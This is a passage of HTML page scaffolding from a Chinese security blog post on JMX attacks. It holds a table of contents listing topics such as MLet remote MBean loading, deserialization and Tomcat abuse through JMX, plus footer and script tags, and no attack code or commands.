class="nav-text">攻击四：利用中间件等的特殊MBean攻击JMX</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87JMX%E6%94%BB%E5%87%BBTomcat"><span class="nav-text">通过JMX攻击Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%B7%B2%E6%9C%89%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-text">获取已有用户的密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%A7%92%E8%89%B2%E7%94%A8%E6%88%B7"><span class="nav-text">添加管理员角色用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E5%BE%AA%E7%8E%AF%E5%87%BD%E6%95%B0%E5%AF%BC%E8%87%B4%E5%86%99shell"><span class="nav-text">日志循环函数导致写shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%9A%84%E7%94%A8%E6%88%B7%E7%9A%84session-ID"><span class="nav-text">抓取网络应用的用户的session ID</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%BA%94%EF%BC%9ARMI%E6%94%BB%E5%87%BB"><span class="nav-text">攻击五：RMI攻击</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="border-box website-info-box default">
        
            <div class="copyright-info info-item default">
                &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2023
                
                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">lazysugar</a>
                
            </div>

            <div class="theme-info info-item default">
                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
            </div>

            

            
                <div class="deploy-info info-item default">
                    
                        本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/deploy-provider/github.png"></span> 提供部署服务
                        
                </div>
            
        

        <div class="count-item info-item default">
            
                <span class="count-box border-box word">
                    <span class="item-type border-box">总字数</span>
                    <span class="item-value border-box word">68.4k</span>
                </span>
            

            

            
        </div>
    </div>
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="tools-list border-box">
        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JMX%E4%BB%8B%E7%BB%8D"><span class="nav-text">JMX介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MBean"><span class="nav-text">MBean</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MBeanServer"><span class="nav-text">MBeanServer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%82%E9%85%8D%E5%99%A8%E5%92%8C%E8%BF%9E%E6%8E%A5%E5%99%A8"><span class="nav-text">适配器和连接器</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8ERMI%E7%9A%84JMX%E6%BC%94%E7%A4%BA"><span class="nav-text">基于RMI的JMX演示</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8jconsole%E5%9B%BE%E5%BD%A2%E5%B7%A5%E5%85%B7%E7%9B%91%E8%A7%86%E3%80%81%E7%AE%A1%E7%90%86JMX"><span class="nav-text">使用jconsole图形工具监视、管理JMX</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8Melt%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BMBean"><span class="nav-text">攻击一：使用Melt加载远程MBean</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8DMLet"><span class="nav-text">介绍MLet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B%E4%B8%8E%E5%88%86%E6%9E%90"><span class="nav-text">攻击示例与分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%BA%8C%EF%BC%9A%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDMBean"><span class="nav-text">攻击二：远程加载MBean</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B"><span class="nav-text">攻击示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%B8%89%EF%BC%9A%E9%80%9A%E8%BF%87MBean%E6%96%B9%E6%B3%95%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BBJMX"><span class="nav-text">攻击三：通过MBean方法参数反序列化攻击JMX</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JMX%E8%B0%83%E7%94%A8MBean%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="nav-text">JMX调用MBean的流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B-1"><span class="nav-text">攻击示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%9B%9B%EF%BC%9A%E5%88%A9%E7%94%A8%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%AD%89%E7%9A%84%E7%89%B9%E6%AE%8AMBean%E6%94%BB%E5%87%BBJMX"><span class="nav-text">攻击四：利用中间件等的特殊MBean攻击JMX</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87JMX%E6%94%BB%E5%87%BBTomcat"><span class="nav-text">通过JMX攻击Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%B7%B2%E6%9C%89%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-text">获取已有用户的密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%A7%92%E8%89%B2%E7%94%A8%E6%88%B7"><span class="nav-text">添加管理员角色用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E5%BE%AA%E7%8E%AF%E5%87%BD%E6%95%B0%E5%AF%BC%E8%87%B4%E5%86%99shell"><span class="nav-text">日志循环函数导致写shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%9A%84%E7%94%A8%E6%88%B7%E7%9A%84session-ID"><span class="nav-text">抓取网络应用的用户的session ID</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%BA%94%EF%BC%9ARMI%E6%94%BB%E5%87%BB"><span class="nav-text">攻击五：RMI攻击</span></a></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>



<!-- common -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local-search -->

    
<script src="/js/local-search.js"></script>



<!-- code-block -->


<!-- lazyload -->


<div class="">
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        
            
<script src="/js/post/toc.js"></script>

        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- category-page -->
    

    <!-- links-page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
